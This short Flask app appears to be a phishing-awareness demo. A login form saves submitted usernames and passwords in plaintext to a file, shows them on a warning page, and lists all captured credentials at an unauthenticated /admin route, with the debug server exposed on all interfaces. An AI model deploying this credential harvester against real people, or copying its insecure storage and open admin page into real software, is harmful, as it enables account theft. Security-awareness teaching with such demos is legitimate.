from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)


# Route for the main login page
@app.route('/')
def login():
    return render_template('login.html')
# Route to handle the form submission and display the submitted data
@app.route('/submit', methods=['POST'])
def submit():
    # Retrieve username and password from the form
    username = request.form.get('username')
    password = request.form.get('password')

    # Save credentials to a text file (for educational purposes only)
    with open("credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    # Pass the credentials to the submit page for display
    return render_template('warning.html', username=username, password=password)

# Admin route to display the contents of credentials.txt
@app.route('/admin')
def admin():
    try:
        # Read the contents of the credentials file
        with open("credentials.txt", "r") as file:
            contents = file.readlines()
    except FileNotFoundError:
        contents = ["No credentials found."]
    
    # Render the contents in the admin.html template
    return render_template('admin.html', contents=contents)
    

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
